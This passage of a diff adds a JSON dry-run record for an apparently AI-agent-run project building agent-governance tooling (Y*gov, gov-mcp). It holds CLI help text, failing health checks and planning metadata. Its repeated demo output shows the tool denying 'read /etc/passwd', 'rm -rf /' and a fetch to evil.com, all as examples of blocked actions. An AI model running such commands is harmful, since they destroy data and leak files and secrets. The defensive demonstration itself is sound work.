+                "LLMs are probabilistic by nature. Auditing them with another probabilistic tool doesn't solve the problem \u2014 it compounds it. A system that is itself uncertain cannot render certain judgments about other systems. No LLM-based audit tool can ",
+                "K9 Audit is causal AI applied to the audit problem. It does not generate or guess \u2014 it verifies. Every agent action is recorded into a **CIEU Ledger** \u2014 a five-tuple causal evidence unit that captures precisely: who acted, what they did, wh",
+                "The CIEU Ledger is not a log. It is a causal evidence ledger. Records are SHA256 hash-chained. Nothing can be silently modified or retroactively falsified. Forensic-grade auditing demands visibility, transparency, tamper-proofness, and repr",
+                "> K9 Audit is not about solving our puzzle. It is about finally solving yours.",
+                "- [Why causal auditing](#why-causal-auditing)",
+                "- [What K9 Audit is](#what-k9-audit-is)",
+                "- [What K9 Audit is not](#what-k9-audit-is-not)",
+                "- [How K9 Audit differs](#how-k9-audit-differs)",
+                "- [Real-time audit alerts](#real-time-audit-alerts)"
+              ],
+              "docs/cieu_event_schema.md": [
+                "# CIEU Event Schema \u2014 Telegram-Pushed Event Types",
+                "**Referenced by**: `scripts/cieu_event_watcher.py`, `scripts/telegram_notify.py`",
+                "watcher daemon. Any row written to `cieu_events` with an `event_type` in this",
+                "`cieu_event_watcher.py` (cron every minute).",
+                "If you emit one of these event_types outside the contract below, you will",
+                "## Pushed event_types",
+                "| Required CIEU fields | `event_type='CRITICAL_INSIGHT'`, `agent_id`, `task_description` (the insight headline, \u2264140 chars), `violations` optional (JSON context). |",
+                "**Example headline**: `\"Scenario C (CROBA inject) is the real USP \u2014 Scenario A is break-glass audit only\"`",
+                "| When to emit | System failure with data-loss risk, governance breach, production customer impact, financial misstep, or any condition requiring Board decision to unblock. |",
+                "| Required CIEU fields | `event_type='MAJOR_INCIDENT'`, `agent_id`, `task_description` (what broke, \u2264140 chars), `file_path` or `command` if applicable, `violations` JSON with `{severity, blast_radius, rollback_available}`. |",
+                "**Example headline**: `\"CIEU DB wal corruption \u2014 47 events lost since 02:14 UTC, no backup\"`",
+                "shipping agent via `telegram_notify.send_event(...)` directly. The watcher"
+              ],
+              "governance/k9_alarm_consumer_v1.md": [
+                "# K9 Alarm Consumer v1 \u2014 Layer 5 Cascade Remediation",
+                "**Context**: Board P0 catch \u2014 6503+ K9 handler events fire with 0 consumer downstream",
+                "K9 routing chain layers 1-4 LIVE (event trigger \u2192 handler emit \u2192 routing table lookup \u2192 handler event emission):",
+                "- HOOK_HEALTH_K9_ESCALATE: 3367 events",
+                "- AGENT_REGISTRY_K9_WARN: 3136 events",
+                "- FORGET_GUARD_K9_WARN: 81 events",
+                "- CZL_K9_WARN: 9 events",
+                "- STOP_HOOK_K9_DENY: 7 events",
+                "- FORGET_GUARD_K9_DENY: 0 events",
+                "Alarm fires but nobody listens \u2192 violations accumulate \u2192 governance efficacy degrades.",
+                "- Poll CIEU DB for K9 handler events (6 types)",
+                "- Track last-seq via `.k9_alarm_consumer_state.json`"
+              ]
+            },
+            "result_status": "pass"
+          },
+          {
+            "decision_effect": "The current route is driven by router, cognition cascade, full-history replay, and E43 first-value predicates.",
+            "family": "E42 / E44A / E43 activated runtime",
+            "invocation_type": "python_function_calls",
+            "invoked": true,
+            "nonfatal": false,
+            "result_data": {
+              "e42_match_count": 12,
+              "e43_runner_passed": true,
+              "e44a_full_history_valid": true,
+              "e44a_route": {
+                "route_changed_from_E43": false,
+                "route_improved_from_E43": true,
+                "technical_substrate": "gov-mcp + Y-star-gov governed execution in 5 minutes",
+                "user_facing_value_object": "Governed Agent Action Proof Packet",
+                "why": "E43 had the right substrate; E44A adds strategic/customer/commercial/evidence/high-imagination reasoning."
+              }
+            },
+            "result_status": "pass"
+          }
+        ],
+        "artifact_id": "e45_full_history_actual_invocation_trace",
+        "assertion_invoked_requires_result_data": true,
+        "customer_validation_claimed": false,
+        "failures_recorded_honestly": true,
+        "generated_at": "2026-05-05T00:00:01Z",
+        "no_external_action": true,
+        "paid_signal_claimed": false
+      },
+      "operations/external_validation/e45_real_local_first_value_demo_run.json": {
+        "Y_star_gov_repo": "/Users/haotianliu/.openclaw/workspace/Y-star-gov",
+        "artifact_id": "e45_real_local_first_value_demo_run",
+        "commands_attempted": [
+          {
+            "classification": "passed",
+            "label": "gov_mcp_server_help",
+            "record": {
+              "command": [
+                "python3",
+                "-m",
+                "gov_mcp",
+                "--help"
+              ],
+              "cwd": "/Users/haotianliu/.openclaw/workspace/gov-mcp",
+              "returncode": 0,
+              "stderr": "",
+              "stdout": "usage: __main__.py [-h] [--session-config SESSION_CONFIG]\n                   [--agents-md AGENTS_MD] [--transport {stdio,sse}]\n                   [--host HOST] [--port PORT]\n                   [--exec-whitelist EXEC_WHITELIST]\n\nGOV MCP \u2014 Y*gov as a standard MCP server\n\noptional arguments:\n  -h, --help            show this help message and exit\n  --session-config SESSION_CONFIG\n                        Path to .ystar_session.json (Y*gov runtime config).\n                        Recommended since gov-mcp 0.2.0. Direct dict load,\n                        confidence \u22650.95.\n  --agents-md AGENTS_MD\n                        [DEPRECATED since 0.2.0] Path to AGENTS.md governance\n                        file. Falls back to regex translation, confidence\n                        \u22640.7. Use --session-config instead.\n  --transport {stdio,sse}\n                        MCP transport (default: stdio)\n  --host HOST           SSE host (only with --transport sse)\n  --port PORT           SSE port (required with --transport sse)\n  --exec-whitelist EXEC_WHITELIST\n                        Path to exec_whitelist.yaml (default: adjacent to\n                        server.py)\n",
+              "timed_out": false
+            }
+          },
+          {
+            "classification": "passed",
+            "label": "gov_mcp_install_help",
+            "record": {
+              "command": [
+                "python3",
+                "-m",
+                "gov_mcp",
+                "install",
+                "--help"
+              ],
+              "cwd": "/Users/haotianliu/.openclaw/workspace/gov-mcp",
+              "returncode": 0,
+              "stderr": "",
+              "stdout": "usage: gov-mcp install [-h] [--agents-md AGENTS_MD] [--port PORT]\n\noptional arguments:\n  -h, --help            show this help message and exit\n  --agents-md AGENTS_MD\n                        Path to AGENTS.md (auto-detected if omitted)\n  --port PORT           Server port (default: 7922, auto if busy)\n",
+              "timed_out": false
+            }
+          },
+          {
+            "classification": "passed",
+            "label": "gov_mcp_status",
+            "record": {
+              "command": [
+                "python3",
+                "-m",
+                "gov_mcp",
+                "status"
+              ],
+              "cwd": "/Users/haotianliu/.openclaw/workspace/gov-mcp",
+              "returncode": 0,
+              "stderr": "",
+              "stdout": "gov-mcp status\n==================================================\n  Running:    no\n  Run 'gov-mcp install' to start.\n",
+              "timed_out": false
+            }
+          },
+          {
+            "classification": "passed",
+            "label": "gov_mcp_command_help",
+            "record": {
+              "command": [
+                "gov-mcp",
+                "--help"
+              ],
+              "cwd": "/Users/haotianliu/.openclaw/workspace/gov-mcp",
+              "returncode": 0,
+              "stderr": "",
+              "stdout": "usage: gov-mcp [-h] {install,uninstall,status,restart} ...\n\nGOV MCP \u2014 Governed execution for AI agents\n\npositional arguments:\n  {install,uninstall,status,restart}\n    install             Detect, start, configure GOV MCP\n    uninstall           Stop server and remove configs\n    status              Show server status\n    restart             Restart server\n\noptions:\n  -h, --help            show this help message and exit\n",
+              "timed_out": false
+            }
+          },
+          {
+            "classification": "skipped_safety",
+            "label": "gov_mcp_install_start_server",
+            "reason": "Would bind a local port and may configure MCP clients; E45 records install --help/status and docs proof instead."
+          },
+          {
+            "classification": "passed",
+            "label": "ystar_help",
+            "record": {
+              "command": [
+                "python3",
+                "-m",
+                "ystar",
+                "--help"
+              ],
+              "cwd": "/Users/haotianliu/.openclaw/workspace/Y-star-gov",
+              "returncode": 0,
+              "stderr": "",
+              "stdout": "\nystar CLI\n\nCommands:\n  ystar setup          Generate .ystar_session.json (required for full governance)\n  ystar hook-install   Register PreToolUse hook\n  ystar init           Generate policy.py contract template\n  ystar audit          View causal audit report\n  ystar archive-cieu   Archive CIEU database to JSONL for permanent preservation\n  ystar simulate       Simulate A/B effect evaluation\n  ystar quality        Evaluate contract quality (coverage/FP rate)\n  ystar check          Run policy check on JSONL events file\n  ystar check-impact   Analyze session file for P0 risks and downstream impact\n  ystar report         Generate governance report\n  ystar baseline       Capture current governance state as baseline\n  ystar delta          Compare current state against baseline\n  ystar trend          Show 7-day CIEU event trend (total/deny/rate)\n  ystar demo           5-second wow moment -- governance in action\n  ystar doctor         Diagnose environment integrity (--layer1, --layer2)\n  ystar reset-breaker      Reset circuit breaker after manual intervention\n  ystar verify             Verify CIEU cryptographic integrity\n  ystar seal               Seal CIEU session with Merkle root\n  ystar policy-builder     Launch local HTML policy builder (port 7921)\n  ystar domain             Discover and use domain packs (list|describe|init)\n  ystar governance-coverage Show governance coverage report (agent/tool coverage)\n  ystar safemode           Board override mechanism (bypass governance with audit trail)\n  ystar version            Show version\n\nQuick start (3 steps to integrate with OpenClaw):\n  pip install ystar\n  ystar setup            <- Step 1: generate session config\n  ystar hook-install     <- Step 2: register hook\n  # Write AGENTS.md      <- Step 3: define your contract\n\n",
+              "timed_out": false
+            }
+          },
+          {
+            "classification": "passed",
+            "label": "ystar_demo",
+            "record": {
+              "command": [
+                "python3",
+                "-m",
+                "ystar",
+                "demo"
+              ],
+              "cwd": "/Users/haotianliu/.openclaw/workspace/Y-star-gov",
+              "returncode": 0,
+              "stderr": "",
+              "stdout": "\nY*gov Demo \u2014 governance in action\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n[1] ALLOW  read ./projects/data.txt               0.07ms\n[2] DENY   read /etc/passwd                       0.04ms\n    \u2192 '/etc' is not allowed in file_path\n[3] ALLOW  run echo \"hello\"                       0.01ms\n[4] DENY   run rm -rf /                           0.01ms\n    \u2192 'rm -rf' is a forbidden command\n[5] DENY   fetch http://evil.com/steal            0.03ms\n    \u2192 domain not in allowed list\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n5 decisions in 0.15ms \u00b7 CIEU chain: intact \u2713\n\nNext: ystar setup && ystar hook-install && ystar doctor\n\n",
+              "timed_out": false
+            }
+          },
+          {
+            "classification": "failed",
+            "label": "ystar_doctor",
+            "record": {
+              "command": [
+                "python3",
+                "-m",
+                "ystar",
+                "doctor"
+              ],
+              "cwd": "/Users/haotianliu/.openclaw/workspace/Y-star-gov",
+              "returncode": 1,
+              "stderr": "",
+              "stdout": "\n  Y*gov Doctor \u2014 Layer1 (Zero-dependency checks)\n  ============================================================\n\n  [1] CIEU Database\n  [\u2713] CIEU Database \u2014 .ystar_cieu.db (52300 events)\n\n  [2] Omission Database\n  [\u2713] Omission Database \u2014 .ystar_cieu_omission.db (1310 violations)\n\n  [3] Contract File\n  [\u2713] Contract File \u2014 AGENTS.md (loaded, 58 lines)\n\n  [4] Interrupt Gate\n  [\u2717] Interrupt Gate \u2014 BLOCKING (9 overdue obligations)\n      \u2192 Complete pending obligations to clear gate\n  [ ] Circuit Breaker \u2014 engine not loaded (check at runtime)\n\n  [5] Unreachable Obligations\n  [\u2717] Unreachable Obligations \u2014 9 found\n      \u2192 Review obligations pending >7 days\n\n  [6] Engine Configuration\n  [\u2713] Engine Config \u2014 Valid (1 agents, 18 rules)\n\n  [7] Archive Freshness\n  [\u2717] Archive Freshness \u2014 31 days since last archive (>7 days)\n      \u2192 Run 'ystar archive-cieu' to preserve CIEU data\n\n  [8] External Config Reads\n  [\u2717] External Config Reads \u2014 1 unique paths detected\n      \u2192 Review external CLAUDE.md for context poisoning\n      \u2192 /Users/haotianliu/.openclaw/workspace/ystar-company/CLAUDE.md (2 reads)\n\n  [9] Runtime Constraints\n  [ ] Runtime deny \u2014 not present (ok)\n  [ ] Runtime relax \u2014 not present (ok)\n\n  [10] Governance Heartbeat\n  [\u2717] Governance Heartbeat \u2014 DEAD (orchestrator not initialized)\n      \u2192 Run agent commands to trigger hook initialization\n  [ ] Path B deny events: 0\n  [ ] Metalearning relax events: 0\n\n  Y*gov Doctor \u2014 Layer2 (Dependency checks)\n  ============================================================\n\n  [1] Git Repository\n  [\u2713] Git Repository \u2014 Available\n\n  [2] Python Dependencies\n  [\u2713] Python Dependencies \u2014 ystar installed (v0.48.0)\n\n  [3] Hook Installation\n  [\u2713] Hook Installation \u2014 Registered in settings.json\n\n  [4] Test Suite\n  [\u2713] Test Suite \u2014 85 test files found\n\n  ============================================================\n  8 passed, 5 failed\n  Run the suggested commands above to fix issues\n",
+              "timed_out": false
+            }
+          },
+          {
+            "classification": "passed",
+            "label": "ystar_command_demo",
+            "record": {
+              "command": [
+                "ystar",
+                "demo"
+              ],
+              "cwd": "/Users/haotianliu/.openclaw/workspace/Y-star-gov",
+              "returncode": 0,
+              "stderr": "",
+              "stdout": "\nY*gov Demo \u2014 governance in action\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n[1] ALLOW  read ./projects/data.txt               0.08ms\n[2] DENY   read /etc/passwd                       0.03ms\n    \u2192 '/etc' is not allowed in file_path\n[3] ALLOW  run echo \"hello\"                       0.01ms\n[4] DENY   run rm -rf /                           0.01ms\n    \u2192 'rm -rf' is a forbidden command\n[5] DENY   fetch http://evil.com/steal            0.03ms\n    \u2192 domain not in allowed list\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n5 decisions in 0.16ms \u00b7 CIEU chain: intact \u2713\n\nNext: ystar setup && ystar hook-install && ystar doctor\n\n",
+              "timed_out": false
+            }
+          }
+        ],
+        "commands_failed_count": 1,
+        "commands_passed_count": 7,
+        "commands_skipped_count": 1,
+        "entrypoints": {
+          "gov_mcp": false,
+          "ystar": false
+        },
+        "generated_at": "2026-05-05T00:00:01Z",
+        "gov_mcp_repo": "/Users/haotianliu/.openclaw/workspace/gov-mcp",
+        "local_demo_readiness_class": "ready_for_owner_review",
+        "no_external_action": true,
+        "no_internet_install": true,
+        "success_predicates": [
+          {
+            "passed": true,
+            "predicate": "gov-mcp local module help available"
+          },
+          {
+            "passed": true,
+            "predicate": "gov-mcp status command available"
+          },
+          {
+            "passed": true,
+            "predicate": "Y-star-gov demo shows allow and deny"
+          },
+          {
+            "passed": true,
+            "predicate": "first 5-minute proof docs fixed"
+          }
+        ]
+      },
+      "operations/knowledge_graph/e45_ceo_kg_read_model_update.json": {
+        "artifact_id": "e45_ceo_kg_read_model_update",
+        "edges_added": 3,
+        "nodes_added": 4,
+        "updated_bottleneck": "CEO can now invoke full-history runtime capabilities and run a local first-value demo, but must next obtain owner approval for one real external user attempt only after unresolved local/demo/docs blockers are cleared."
+      }
+    },
+    "no_external_action": true,
+    "read_model_role": "active read context assembled from wisdom, working memory status, latest KG/brain/read-model artifacts, directives, and commercial assets",
+    "task": {
+      "task_description": "Prepare the fastest credible path toward one real external user successfully installing, understanding, and valuing Y*gov / gov-mcp / Y*Bridge Labs agent-company runtime.",
+      "task_id": "e46b_first_value_demo",
+      "task_title": "First value canonical spine rerun"
+    },
+    "wisdom_search": {
+      "invoked": true,
+      "returncode": 0,
+      "top_results": [
+        {
+          "name": "Aiden Meta Development Method Kernel",
+          "path": "AIDEN_META_DEVELOPMENT_METHOD_KERNEL.md",
+          "score": 0.2711,
+          "type": ""
+        },
+        {
+          "name": "M Triangle",
+          "path": "M_TRIANGLE.md",
+          "score": 0.2334,
+          "type": ""
+        },
+        {
+          "name": "CEO Strategic Thinking Frameworks (\u5b66\u4e60\u7b14\u8bb0 Round 2)",
+          "path": "ceo_learning/strategic_thinking_frameworks.md",
+          "score": 0.2036,
+          "type": "ceo_learning"
+        }
+      ]
+    },
+    "working_memory": {
+      "invoked": true,
+      "returncode": 1,
+      "status": "unavailable_nonfatal",
+      "stderr": "No snapshots found\n",
+      "stdout": ""
+    }
+  },
+  "closure_packet": {
+    "capability_router_invoked": true,
+    "ceo_brain_context_loaded": true,
+    "cognition_cascade_invoked": true,
+    "local_demo_status": "ready_for_owner_review",
+    "owner_approval_required_before_external_action": true,
+    "projection_chain_created": true,
+    "remaining_blockers": [
+      "ystar_doctor",
+      "gov_mcp_install_start_server"
+    ]
+  },
+  "cognition_cascade_route": {
+    "route_changed_from_E43": false,
+    "route_improved_from_E43": true,
+    "technical_substrate": "gov-mcp + Y-star-gov governed execution in 5 minutes",
+    "user_facing_value_object": "Governed Agent Action Proof Packet",
+    "why": "E43 had the right substrate; E44A adds strategic/customer/commercial/evidence/high-imagination reasoning."
+  },
+  "commercial_wrapper_comparison": [
+    {
+      "reason": "E45 local commands passed except doctor/environment gaps",
+      "role": "first local substrate",
+      "route": "gov-mcp + Y-star-gov CLI proof",
+      "status": "active"
+    },
+    {
+      "reason": "best explains allow/deny evidence without validation claims",
+      "role": "first user-facing value object",
+      "route": "Governed Agent Action Proof Packet",
+      "status": "active"
+    },
+    {
+      "reason": "12 commercial/plugin assets found but packaging not closed",
+      "role": "commercial wrapper candidate",
+      "route": "Claude Desktop plugin / MCPB",
+      "status": "watchlist"
+    },
+    {
+      "reason": "requires stronger local proof and owner-approved external action",
+      "role": "later revenue route",
+      "route": "bug bounty / workflow resale / enterprise",
+      "status": "parked"
+    }
+  ],
+  "constitutional_target_alignment": "value production before claim expansion; learning must close through CIEU/CZL",
+  "evidence_audit_context": {
+    "no_duplicate_audit_layer": true,
+    "uses_E45_invocation_trace": true,
+    "uses_K9_CIEU_CZL_as_context": true
+  },
+  "governance_boundary": {
+    "Y_star_gov_owns_kernel": true,
+    "gov_mcp_owns_execution_boundary": true,
+    "owner_approval_required_for_external_action": true
+  },
+  "invoked_capabilities": {
+    "e42_match_count": 12,
+    "e44a_stage_count": 15,
+    "e45_command_count": 9
+  },
+  "local_demo_status": {
+    "Y_star_gov_repo": "/Users/haotianliu/.openclaw/workspace/Y-star-gov",
+    "artifact_id": "e45_real_local_first_value_demo_run",
+    "commands_attempted": [
+      {
+        "classification": "passed",
+        "label": "gov_mcp_server_help",
+        "record": {
+          "command": [
+            "python3",
+            "-m",
+            "gov_mcp",
+            "--help"
+          ],
+          "cwd": "/Users/haotianliu/.openclaw/workspace/gov-mcp",
+          "returncode": 0,
+          "stderr": "",
+          "stdout": "usage: __main__.py [-h] [--session-config SESSION_CONFIG]\n                   [--agents-md AGENTS_MD] [--transport {stdio,sse}]\n                   [--host HOST] [--port PORT]\n                   [--exec-whitelist EXEC_WHITELIST]\n\nGOV MCP \u2014 Y*gov as a standard MCP server\n\noptional arguments:\n  -h, --help            show this help message and exit\n  --session-config SESSION_CONFIG\n                        Path to .ystar_session.json (Y*gov runtime config).\n                        Recommended since gov-mcp 0.2.0. Direct dict load,\n                        confidence \u22650.95.\n  --agents-md AGENTS_MD\n                        [DEPRECATED since 0.2.0] Path to AGENTS.md governance\n                        file. Falls back to regex translation, confidence\n                        \u22640.7. Use --session-config instead.\n  --transport {stdio,sse}\n                        MCP transport (default: stdio)\n  --host HOST           SSE host (only with --transport sse)\n  --port PORT           SSE port (required with --transport sse)\n  --exec-whitelist EXEC_WHITELIST\n                        Path to exec_whitelist.yaml (default: adjacent to\n                        server.py)\n",
+          "timed_out": false
+        }
+      },
+      {
+        "classification": "passed",
+        "label": "gov_mcp_install_help",
+        "record": {
+          "command": [
+            "python3",
+            "-m",
+            "gov_mcp",
+            "install",
+            "--help"
+          ],
+          "cwd": "/Users/haotianliu/.openclaw/workspace/gov-mcp",
+          "returncode": 0,
+          "stderr": "",
+          "stdout": "usage: gov-mcp install [-h] [--agents-md AGENTS_MD] [--port PORT]\n\noptional arguments:\n  -h, --help            show this help message and exit\n  --agents-md AGENTS_MD\n                        Path to AGENTS.md (auto-detected if omitted)\n  --port PORT           Server port (default: 7922, auto if busy)\n",
+          "timed_out": false
+        }
+      },
+      {
+        "classification": "passed",
+        "label": "gov_mcp_status",
+        "record": {
+          "command": [
+            "python3",
+            "-m",
+            "gov_mcp",
+            "status"
+          ],
+          "cwd": "/Users/haotianliu/.openclaw/workspace/gov-mcp",
+          "returncode": 0,
+          "stderr": "",
+          "stdout": "gov-mcp status\n==================================================\n  Running:    no\n  Run 'gov-mcp install' to start.\n",
+          "timed_out": false
+        }
+      },
+      {
+        "classification": "passed",
+        "label": "gov_mcp_command_help",
+        "record": {
+          "command": [
+            "gov-mcp",
+            "--help"
+          ],
+          "cwd": "/Users/haotianliu/.openclaw/workspace/gov-mcp",
+          "returncode": 0,
+          "stderr": "",
+          "stdout": "usage: gov-mcp [-h] {install,uninstall,status,restart} ...\n\nGOV MCP \u2014 Governed execution for AI agents\n\npositional arguments:\n  {install,uninstall,status,restart}\n    install             Detect, start, configure GOV MCP\n    uninstall           Stop server and remove configs\n    status              Show server status\n    restart             Restart server\n\noptions:\n  -h, --help            show this help message and exit\n",
+          "timed_out": false
+        }
+      },
+      {
+        "classification": "skipped_safety",
+        "label": "gov_mcp_install_start_server",
+        "reason": "Would bind a local port and may configure MCP clients; not required for E45 no-external local proof."
+      },
+      {
+        "classification": "passed",
+        "label": "ystar_help",
+        "record": {
+          "command": [
+            "python3",
+            "-m",
+            "ystar",
+            "--help"
+          ],
+          "cwd": "/Users/haotianliu/.openclaw/workspace/Y-star-gov",
+          "returncode": 0,
+          "stderr": "",
+          "stdout": "\nystar CLI\n\nCommands:\n  ystar setup          Generate .ystar_session.json (required for full governance)\n  ystar hook-install   Register PreToolUse hook\n  ystar init           Generate policy.py contract template\n  ystar audit          View causal audit report\n  ystar archive-cieu   Archive CIEU database to JSONL for permanent preservation\n  ystar simulate       Simulate A/B effect evaluation\n  ystar quality        Evaluate contract quality (coverage/FP rate)\n  ystar check          Run policy check on JSONL events file\n  ystar check-impact   Analyze session file for P0 risks and downstream impact\n  ystar report         Generate governance report\n  ystar baseline       Capture current governance state as baseline\n  ystar delta          Compare current state against baseline\n  ystar trend          Show 7-day CIEU event trend (total/deny/rate)\n  ystar demo           5-second wow moment -- governance in action\n  ystar doctor         Diagnose environment integrity (--layer1, --layer2)\n  ystar reset-breaker      Reset circuit breaker after manual intervention\n  ystar verify             Verify CIEU cryptographic integrity\n  ystar seal               Seal CIEU session with Merkle root\n  ystar policy-builder     Launch local HTML policy builder (port 7921)\n  ystar domain             Discover and use domain packs (list|describe|init)\n  ystar governance-coverage Show governance coverage report (agent/tool coverage)\n  ystar safemode           Board override mechanism (bypass governance with audit trail)\n  ystar version            Show version\n\nQuick start (3 steps to integrate with OpenClaw):\n  pip install ystar\n  ystar setup            <- Step 1: generate session config\n  ystar hook-install     <- Step 2: register hook\n  # Write AGENTS.md      <- Step 3: define your contract\n\n",
+          "timed_out": false
+        }
+      },
+      {
+        "classification": "passed",
+        "label": "ystar_demo",
+        "record": {
+          "command": [
+            "python3",
+            "-m",
+            "ystar",
+            "demo"
+          ],
+          "cwd": "/Users/haotianliu/.openclaw/workspace/Y-star-gov",
+          "returncode": 0,
+          "stderr": "",
+          "stdout": "\nY*gov Demo \u2014 governance in action\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n[1] ALLOW  read ./projects/data.txt               0.06ms\n[2] DENY   read /etc/passwd                       0.04ms\n    \u2192 '/etc' is not allowed in file_path\n[3] ALLOW  run echo \"hello\"                       0.01ms\n[4] DENY   run rm -rf /                           0.01ms\n    \u2192 'rm -rf' is a forbidden command\n[5] DENY   fetch http://evil.com/steal            0.03ms\n    \u2192 domain not in allowed list\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n5 decisions in 0.15ms \u00b7 CIEU chain: intact \u2713\n\nNext: ystar setup && ystar hook-install && ystar doctor\n\n",
+          "timed_out": false
+        }
+      },
+      {
+        "classification": "failed",
+        "label": "ystar_doctor",
+        "record": {
+          "command": [
+            "python3",
+            "-m",
+            "ystar",
+            "doctor"
+          ],
+          "cwd": "/Users/haotianliu/.openclaw/workspace/Y-star-gov",
+          "returncode": 1,
+          "stderr": "",
+          "stdout": "\n  Y*gov Doctor \u2014 Layer1 (Zero-dependency checks)\n  ============================================================\n\n  [1] CIEU Database\n  [\u2713] CIEU Database \u2014 .ystar_cieu.db (52300 events)\n\n  [2] Omission Database\n  [\u2713] Omission Database \u2014 .ystar_cieu_omission.db (1310 violations)\n\n  [3] Contract File\n  [\u2713] Contract File \u2014 AGENTS.md (loaded, 58 lines)\n\n  [4] Interrupt Gate\n  [\u2717] Interrupt Gate \u2014 BLOCKING (9 overdue obligations)\n      \u2192 Complete pending obligations to clear gate\n  [ ] Circuit Breaker \u2014 engine not loaded (check at runtime)\n\n  [5] Unreachable Obligations\n  [\u2717] Unreachable Obligations \u2014 9 found\n      \u2192 Review obligations pending >7 days\n\n  [6] Engine Configuration\n  [\u2713] Engine Config \u2014 Valid (1 agents, 18 rules)\n\n  [7] Archive Freshness\n  [\u2717] Archive Freshness \u2014 32 days since last archive (>7 days)\n      \u2192 Run 'ystar archive-cieu' to preserve CIEU data\n\n  [8] External Config Reads\n  [\u2717] External Config Reads \u2014 1 unique paths detected\n      \u2192 Review external CLAUDE.md for context poisoning\n      \u2192 /Users/haotianliu/.openclaw/workspace/ystar-company/CLAUDE.md (2 reads)\n\n  [9] Runtime Constraints\n  [ ] Runtime deny \u2014 not present (ok)\n  [ ] Runtime relax \u2014 not present (ok)\n\n  [10] Governance Heartbeat\n  [\u2717] Governance Heartbeat \u2014 DEAD (orchestrator not initialized)\n      \u2192 Run agent commands to trigger hook initialization\n  [ ] Path B deny events: 0\n  [ ] Metalearning relax events: 0\n\n  Y*gov Doctor \u2014 Layer2 (Dependency checks)\n  ============================================================\n\n  [1] Git Repository\n  [\u2713] Git Repository \u2014 Available\n\n  [2] Python Dependencies\n  [\u2713] Python Dependencies \u2014 ystar installed (v0.48.0)\n\n  [3] Hook Installation\n  [\u2713] Hook Installation \u2014 Registered in settings.json\n\n  [4] Test Suite\n  [\u2713] Test Suite \u2014 85 test files found\n\n  ============================================================\n  8 passed, 5 failed\n  Run the suggested commands above to fix issues\n",
+          "timed_out": false
+        }
+      },
+      {
+        "classification": "passed",
+        "label": "ystar_command_demo",
+        "record": {
+          "command": [
+            "ystar",
+            "demo"
+          ],
+          "cwd": "/Users/haotianliu/.openclaw/workspace/Y-star-gov",
+          "returncode": 0,
+          "stderr": "",
+          "stdout": "\nY*gov Demo \u2014 governance in action\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n[1] ALLOW  read ./projects/data.txt               0.05ms\n[2] DENY   read /etc/passwd                       0.03ms\n    \u2192 '/etc' is not allowed in file_path\n[3] ALLOW  run echo \"hello\"                       0.01ms\n[4] DENY   run rm -rf /                           0.01ms\n    \u2192 'rm -rf' is a forbidden command\n[5] DENY   fetch http://evil.com/steal            0.03ms\n    \u2192 domain not in allowed list\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n5 decisions in 0.12ms \u00b7 CIEU chain: intact \u2713\n\nNext: ystar setup && ystar hook-install && ystar doctor\n\n",
+          "timed_out": false
+        }
+      }
+    ],
+    "commands_failed_count": 1,
+    "commands_passed_count": 7,
+    "commands_skipped_count": 1,
+    "entrypoints": {
+      "gov_mcp": true,
+      "ystar": true
+    },
+    "gov_mcp_repo": "/Users/haotianliu/.openclaw/workspace/gov-mcp",
+    "local_demo_readiness_class": "ready_for_owner_review",
+    "no_external_action": true,
+    "no_internet_install": true,
+    "success_predicates": [
+      {
+        "passed": true,
+        "predicate": "gov-mcp local module help available"
+      },
+      {
+        "passed": true,
+        "predicate": "gov-mcp status command available"
+      },
+      {
+        "passed": true,
+        "predicate": "Y-star-gov demo shows allow and deny"
+      },
+      {
+        "passed": true,
+        "predicate": "first 5-minute proof docs fixed"
+      }
+    ]
+  },
+  "mode": "local_dry_run",
+  "next_recommended_milestone": "E47_gov_mcp_server_client_demo_closure",
+  "no_external_action": true,
+  "projection_chain": {
+    "action_candidates": [
+      "run canonical dry-run",
+      "reuse E45 local demo",
+      "close gov-mcp server/client demo gap",
+      "prepare owner-approved external attempt only after blockers"
+    ],
+    "artifact_id": "e46b_field_projection_adapter_result",
+    "behavior_constraints": [
+      "no contact",
+      "no send",
+      "no provider/API",
+      "no internet install",
+      "no duplicate governance/execution/audit/brain/KG"
+    ],
+    "board_directive_link": [
+      "| 1 | Enterprise customer research | CSO | \u2705 \u5b8c\u6210 | sales/enterprise_prospects_0.48.0.md (10.8KB) |",
+      "| 2 | Phase 2 OmissionEngine | CTO | \u2705 7/7 | \u540c\u4e0a |",
+      "| #009 CFO OmissionEngine | 2026-03-27 | 3/3 |",
